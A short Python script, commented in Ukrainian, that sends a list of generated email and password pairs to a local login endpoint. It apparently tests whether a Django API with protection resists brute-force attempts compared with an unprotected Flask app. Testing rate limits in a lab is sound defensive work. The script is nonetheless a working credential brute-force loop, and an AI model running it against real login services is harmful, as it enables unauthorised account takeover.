import requests

url = "http://127.0.0.1:8000/api/auth/login/"  # із захистом (Django)
# url = "http://127.0.0.1:5000/login"  # Без захисту (Flask)

rand_email_and_passwd = [
    {"email": f"user{i}@example.com", "password": f"password{i}"} for i in range(2, 101)
]

def brute_force():
    for combo in rand_email_and_passwd:
        data = {
            "email": combo["email"],
            "password": combo["password"]
        }
        response = requests.post(url, data=data)
        try:
            print(response.json())
        except requests.exceptions.JSONDecodeError:
            pass
        if "Авторизація успішна!" in response.text or "Список оголошень" in response.text:
            print(f"[УСПІХ] Вхід успішний: {combo}")
            break
        else:
            print(f"[НЕВДАЧА] Невірна комбінація: {combo}")

if __name__ == "__main__":
    brute_force()
